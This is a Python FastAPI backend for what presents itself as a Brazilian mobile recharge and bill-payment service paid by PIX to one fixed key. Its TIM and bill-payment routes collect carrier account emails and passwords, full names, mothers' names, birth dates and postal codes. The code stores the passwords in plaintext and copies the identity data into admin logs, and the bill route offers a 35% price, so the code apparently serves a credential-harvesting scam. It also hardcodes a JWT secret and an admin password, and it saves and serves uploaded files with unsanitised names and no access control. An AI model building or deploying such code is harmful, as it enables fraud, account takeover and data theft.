from fastapi import FastAPI, APIRouter, HTTPException, Depends, UploadFile, File, Form
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, EmailStr
from typing import List, Optional
import uuid
from datetime import datetime, timezone, timedelta
import bcrypt
import jwt
import aiofiles
from enum import Enum

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# JWT Settings
SECRET_KEY = "recarga_telefonica_secret_key_2024"
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 1440  # 24 hours

security = HTTPBearer()

# Create the main app without a prefix
app = FastAPI(title="Sistema de Recarga Telefônica")

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Create uploads directory
os.makedirs("uploads", exist_ok=True)

class OperatorType(str, Enum):
    VIVO = "vivo"
    TIM = "tim"
    CLARO = "claro"

class TransactionStatus(str, Enum):
    PENDING = "pending"
    PAID = "paid"
    COMPLETED = "completed"
    CANCELLED = "cancelled"

class TransactionType(str, Enum):
    RECHARGE_VIVO = "recharge_vivo"
    RECHARGE_TIM = "recharge_tim"
    RECHARGE_CLARO = "recharge_claro"
    PAY_BILL = "pay_bill"

# Models
class UserCreate(BaseModel):
    name: str
    email: EmailStr
    password: str
    phone: str
    account_number: str

class UserLogin(BaseModel):
    email: EmailStr
    password: str

class AdminLogin(BaseModel):
    username: str
    password: str

class User(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    name: str
    email: str
    phone: str
    account_number: str
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class Admin(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    username: str
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class VivoRecharge(BaseModel):
    phone_number: str
    amount_paid: float
    amount_received: float

class TimRecharge(BaseModel):
    phone_number: str
    tim_email: str
    tim_password: str
    amount_paid: float
    amount_received: float
    cep: str
    full_name: str
    mother_name: str
    birth_date: str

class PayBill(BaseModel):
    phone_number: str
    operator: OperatorType
    account_password: str
    bill_amount: float

class Transaction(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    user_id: str
    transaction_type: TransactionType
    operator: OperatorType
    phone_number: str
    amount_paid: float
    amount_received: Optional[float] = None
    tim_email: Optional[str] = None
    tim_password: Optional[str] = None
    account_password: Optional[str] = None
    status: TransactionStatus = TransactionStatus.PENDING
    pix_key: str = "e0478dfb-0f3b-4837-977c-bc3a23622854"
    receipt_filename: Optional[str] = None
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
    updated_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class AdminLog(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    transaction_id: str
    user_email: str
    action: str
    details: dict
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

# Helper functions
def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')

def verify_password(password: str, hashed: str) -> bool:
    return bcrypt.checkpw(password.encode('utf-8'), hashed.encode('utf-8'))

def create_access_token(data: dict, expires_delta: Optional[timedelta] = None):
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.now(timezone.utc) + expires_delta
    else:
        expire = datetime.now(timezone.utc) + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return encoded_jwt

async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    try:
        payload = jwt.decode(credentials.credentials, SECRET_KEY, algorithms=[ALGORITHM])
        user_id: str = payload.get("sub")
        user_type: str = payload.get("type")
        if user_id is None:
            raise HTTPException(status_code=401, detail="Invalid token")
        return {"id": user_id, "type": user_type}
    except jwt.PyJWTError:
        raise HTTPException(status_code=401, detail="Invalid token")

async def get_current_admin(current_user = Depends(get_current_user)):
    if current_user["type"] != "admin":
        raise HTTPException(status_code=403, detail="Admin access required")
    return current_user

# Initialize admin user
async def init_admin():
    admin_exists = await db.admins.find_one({"username": "ADM"})
    if not admin_exists:
        hashed_password = hash_password("Usuarioderecargathstore1234554321!@")
        admin_dict = {
            "id": str(uuid.uuid4()),
            "username": "ADM",
            "password": hashed_password,
            "created_at": datetime.now(timezone.utc).isoformat()
        }
        await db.admins.insert_one(admin_dict)
        print("Admin user created successfully")

# Root route
@api_router.get("/")
async def root():
    return {"message": "Sistema de Recarga Telefônica API v1.0", "status": "running"}

# Auth Routes
@api_router.post("/auth/register")
async def register_user(user_data: UserCreate):
    # Check if user exists
    existing_user = await db.users.find_one({"email": user_data.email})
    if existing_user:
        raise HTTPException(status_code=400, detail="Email já cadastrado")
    
    # Hash password and create user
    hashed_password = hash_password(user_data.password)
    user_dict = {
        "id": str(uuid.uuid4()),
        "name": user_data.name,
        "email": user_data.email,
        "phone": user_data.phone,
        "account_number": user_data.account_number,
        "password": hashed_password,
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    
    await db.users.insert_one(user_dict)
    
    # Create token
    token = create_access_token(data={"sub": user_dict["id"], "type": "user"})
    
    return {
        "access_token": token,
        "token_type": "bearer",
        "user": User(**user_dict)
    }

@api_router.post("/auth/login")
async def login_user(login_data: UserLogin):
    user = await db.users.find_one({"email": login_data.email})
    if not user or not verify_password(login_data.password, user["password"]):
        raise HTTPException(status_code=401, detail="Email ou senha inválidos")
    
    token = create_access_token(data={"sub": user["id"], "type": "user"})
    
    return {
        "access_token": token,
        "token_type": "bearer",
        "user": User(**user)
    }

@api_router.post("/auth/admin-login")
async def login_admin(login_data: AdminLogin):
    admin = await db.admins.find_one({"username": login_data.username})
    if not admin or not verify_password(login_data.password, admin["password"]):
        raise HTTPException(status_code=401, detail="Usuário ou senha inválidos")
    
    token = create_access_token(data={"sub": admin["id"], "type": "admin"})
    
    return {
        "access_token": token,
        "token_type": "bearer",
        "admin": Admin(**admin)
    }

# Transaction Routes
@api_router.post("/transactions/vivo-recharge")
async def create_vivo_recharge(recharge_data: VivoRecharge, current_user = Depends(get_current_user)):
    if current_user["type"] != "user":
        raise HTTPException(status_code=403, detail="User access required")
    
    transaction_dict = {
        "id": str(uuid.uuid4()),
        "user_id": current_user["id"],
        "transaction_type": TransactionType.RECHARGE_VIVO,
        "operator": OperatorType.VIVO,
        "phone_number": recharge_data.phone_number,
        "amount_paid": recharge_data.amount_paid,
        "amount_received": recharge_data.amount_received,
        "status": TransactionStatus.PENDING,
        "pix_key": "e0478dfb-0f3b-4837-977c-bc3a23622854",
        "created_at": datetime.now(timezone.utc).isoformat(),
        "updated_at": datetime.now(timezone.utc).isoformat()
    }
    
    await db.transactions.insert_one(transaction_dict)
    
    # Create admin log
    user = await db.users.find_one({"id": current_user["id"]})
    log_dict = {
        "id": str(uuid.uuid4()),
        "transaction_id": transaction_dict["id"],
        "user_email": user["email"],
        "action": "Nova recarga Vivo criada",
        "details": {
            "phone": recharge_data.phone_number,
            "paid": recharge_data.amount_paid,
            "received": recharge_data.amount_received
        },
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    await db.admin_logs.insert_one(log_dict)
    
    return Transaction(**transaction_dict)

@api_router.post("/transactions/tim-planos")
async def create_tim_planos_recharge(recharge_data: TimRecharge, current_user = Depends(get_current_user)):
    if current_user["type"] != "user":
        raise HTTPException(status_code=403, detail="User access required")
    
    transaction_dict = {
        "id": str(uuid.uuid4()),
        "user_id": current_user["id"],
        "transaction_type": TransactionType.RECHARGE_TIM,
        "operator": OperatorType.TIM,
        "phone_number": recharge_data.phone_number,
        "amount_paid": recharge_data.amount_paid,
        "amount_received": recharge_data.amount_received,
        "tim_email": recharge_data.tim_email,
        "tim_password": recharge_data.tim_password,
        "cep": recharge_data.cep,
        "full_name": recharge_data.full_name,
        "mother_name": recharge_data.mother_name,
        "birth_date": recharge_data.birth_date,
        "status": TransactionStatus.PENDING,
        "pix_key": "e0478dfb-0f3b-4837-977c-bc3a23622854",
        "created_at": datetime.now(timezone.utc).isoformat(),
        "updated_at": datetime.now(timezone.utc).isoformat()
    }
    
    await db.transactions.insert_one(transaction_dict)
    
    # Create admin log
    user = await db.users.find_one({"id": current_user["id"]})
    log_dict = {
        "id": str(uuid.uuid4()),
        "transaction_id": transaction_dict["id"],
        "user_email": user["email"],
        "action": "Nova recarga TIM Planos criada",
        "details": {
            "phone": recharge_data.phone_number,
            "paid": recharge_data.amount_paid,
            "received": recharge_data.amount_received,
            "tim_email": recharge_data.tim_email,
            "cep": recharge_data.cep,
            "full_name": recharge_data.full_name,
            "mother_name": recharge_data.mother_name,
            "birth_date": recharge_data.birth_date
        },
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    await db.admin_logs.insert_one(log_dict)
    
    return Transaction(**transaction_dict)

@api_router.post("/transactions/tim-recharge")
async def create_tim_simple_recharge(recharge_data: VivoRecharge, current_user = Depends(get_current_user)):
    if current_user["type"] != "user":
        raise HTTPException(status_code=403, detail="User access required")
    
    transaction_dict = {
        "id": str(uuid.uuid4()),
        "user_id": current_user["id"],
        "transaction_type": TransactionType.RECHARGE_TIM,
        "operator": OperatorType.TIM,
        "phone_number": recharge_data.phone_number,
        "amount_paid": recharge_data.amount_paid,
        "amount_received": recharge_data.amount_received,
        "status": TransactionStatus.PENDING,
        "pix_key": "e0478dfb-0f3b-4837-977c-bc3a23622854",
        "created_at": datetime.now(timezone.utc).isoformat(),
        "updated_at": datetime.now(timezone.utc).isoformat()
    }
    
    await db.transactions.insert_one(transaction_dict)
    
    # Create admin log
    user = await db.users.find_one({"id": current_user["id"]})
    log_dict = {
        "id": str(uuid.uuid4()),
        "transaction_id": transaction_dict["id"],
        "user_email": user["email"],
        "action": "Nova recarga TIM simples criada",
        "details": {
            "phone": recharge_data.phone_number,
            "paid": recharge_data.amount_paid,
            "received": recharge_data.amount_received
        },
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    await db.admin_logs.insert_one(log_dict)
    
    return Transaction(**transaction_dict)

@api_router.post("/transactions/claro-recharge")
async def create_claro_recharge(recharge_data: VivoRecharge, current_user = Depends(get_current_user)):
    if current_user["type"] != "user":
        raise HTTPException(status_code=403, detail="User access required")
    
    transaction_dict = {
        "id": str(uuid.uuid4()),
        "user_id": current_user["id"],
        "transaction_type": TransactionType.RECHARGE_CLARO,
        "operator": OperatorType.CLARO,
        "phone_number": recharge_data.phone_number,
        "amount_paid": recharge_data.amount_paid,
        "amount_received": recharge_data.amount_received,
        "status": TransactionStatus.PENDING,
        "pix_key": "e0478dfb-0f3b-4837-977c-bc3a23622854",
        "created_at": datetime.now(timezone.utc).isoformat(),
        "updated_at": datetime.now(timezone.utc).isoformat()
    }
    
    await db.transactions.insert_one(transaction_dict)
    
    # Create admin log
    user = await db.users.find_one({"id": current_user["id"]})
    log_dict = {
        "id": str(uuid.uuid4()),
        "transaction_id": transaction_dict["id"],
        "user_email": user["email"],
        "action": "Nova recarga Claro criada",
        "details": {
            "phone": recharge_data.phone_number,
            "paid": recharge_data.amount_paid,
            "received": recharge_data.amount_received
        },
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    await db.admin_logs.insert_one(log_dict)
    
    return Transaction(**transaction_dict)

@api_router.post("/transactions/pay-bill")
async def create_pay_bill(bill_data: PayBill, current_user = Depends(get_current_user)):
    if current_user["type"] != "user":
        raise HTTPException(status_code=403, detail="User access required")
    
    # Calculate amount to pay (35% of original bill)
    discounted_amount = bill_data.bill_amount * 0.35
    
    transaction_dict = {
        "id": str(uuid.uuid4()),
        "user_id": current_user["id"],
        "transaction_type": TransactionType.PAY_BILL,
        "operator": bill_data.operator,
        "phone_number": bill_data.phone_number,
        "amount_paid": discounted_amount,
        "amount_received": bill_data.bill_amount,  # Original bill amount
        "account_password": bill_data.account_password,
        "status": TransactionStatus.PENDING,
        "pix_key": "e0478dfb-0f3b-4837-977c-bc3a23622854",
        "created_at": datetime.now(timezone.utc).isoformat(),
        "updated_at": datetime.now(timezone.utc).isoformat()
    }
    
    await db.transactions.insert_one(transaction_dict)
    
    # Create admin log
    user = await db.users.find_one({"id": current_user["id"]})
    log_dict = {
        "id": str(uuid.uuid4()),
        "transaction_id": transaction_dict["id"],
        "user_email": user["email"],
        "action": "Nova solicitação de pagamento de fatura",
        "details": {
            "phone": bill_data.phone_number,
            "operator": bill_data.operator,
            "bill_amount": bill_data.bill_amount,
            "discounted_amount": discounted_amount,
            "has_password": bool(bill_data.account_password)
        },
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    await db.admin_logs.insert_one(log_dict)
    
    return Transaction(**transaction_dict)

@api_router.post("/transactions/{transaction_id}/upload-receipt")
async def upload_receipt(transaction_id: str, file: UploadFile = File(...), current_user = Depends(get_current_user)):
    if current_user["type"] != "user":
        raise HTTPException(status_code=403, detail="User access required")
    
    # Check if transaction exists and belongs to user
    transaction = await db.transactions.find_one({
        "id": transaction_id,
        "user_id": current_user["id"]
    })
    
    if not transaction:
        raise HTTPException(status_code=404, detail="Transação não encontrada")
    
    # Save file
    filename = f"{transaction_id}_{file.filename}"
    file_path = f"uploads/{filename}"
    
    async with aiofiles.open(file_path, 'wb') as f:
        content = await file.read()
        await f.write(content)
    
    # Update transaction
    await db.transactions.update_one(
        {"id": transaction_id},
        {
            "$set": {
                "receipt_filename": filename,
                "status": TransactionStatus.PAID,
                "updated_at": datetime.now(timezone.utc).isoformat()
            }
        }
    )
    
    # Create admin log
    user = await db.users.find_one({"id": current_user["id"]})
    log_dict = {
        "id": str(uuid.uuid4()),
        "transaction_id": transaction_id,
        "user_email": user["email"],
        "action": "Comprovante de pagamento enviado",
        "details": {
            "filename": filename,
            "transaction_type": transaction["transaction_type"]
        },
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    await db.admin_logs.insert_one(log_dict)
    
    return {"message": "Comprovante enviado com sucesso"}

# Admin Routes
@api_router.get("/admin/transactions")
async def get_all_transactions(current_admin = Depends(get_current_admin)):
    transactions = await db.transactions.find().sort("created_at", -1).to_list(1000)
    return [Transaction(**transaction) for transaction in transactions]

# Alternative file serving route
@api_router.get("/files/{filename}")
async def get_file(filename: str, current_admin = Depends(get_current_admin)):
    file_path = f"uploads/{filename}"
    if os.path.exists(file_path):
        return FileResponse(file_path)
    else:
        raise HTTPException(status_code=404, detail="Arquivo não encontrado")

@api_router.get("/admin/logs")
async def get_admin_logs(current_admin = Depends(get_current_admin)):
    logs = await db.admin_logs.find().sort("created_at", -1).to_list(1000)
    return [AdminLog(**log) for log in logs]

@api_router.get("/admin/transaction/{transaction_id}")
async def get_transaction_details(transaction_id: str, current_admin = Depends(get_current_admin)):
    transaction = await db.transactions.find_one({"id": transaction_id})
    if not transaction:
        raise HTTPException(status_code=404, detail="Transação não encontrada")
    
    # Get user details
    user = await db.users.find_one({"id": transaction["user_id"]})
    
    return {
        "transaction": Transaction(**transaction),
        "user": User(**user) if user else None
    }

@api_router.put("/admin/transaction/{transaction_id}/status")
async def update_transaction_status(transaction_id: str, status: TransactionStatus, current_admin = Depends(get_current_admin)):
    result = await db.transactions.update_one(
        {"id": transaction_id},
        {
            "$set": {
                "status": status,
                "updated_at": datetime.now(timezone.utc).isoformat()
            }
        }
    )
    
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="Transação não encontrada")
    
    return {"message": "Status atualizado com sucesso"}

# User Routes
@api_router.get("/user/transactions")
async def get_user_transactions(current_user = Depends(get_current_user)):
    if current_user["type"] != "user":
        raise HTTPException(status_code=403, detail="User access required")
    
    transactions = await db.transactions.find({
        "user_id": current_user["id"]
    }).sort("created_at", -1).to_list(1000)
    
    return [Transaction(**transaction) for transaction in transactions]

# Include the router in the main app
app.include_router(api_router)

# Mount static files after router
app.mount("/uploads", StaticFiles(directory="uploads"), name="uploads")

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("startup")
async def startup_event():
    await init_admin()
    logger.info("Sistema de Recarga Telefônica iniciado")

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
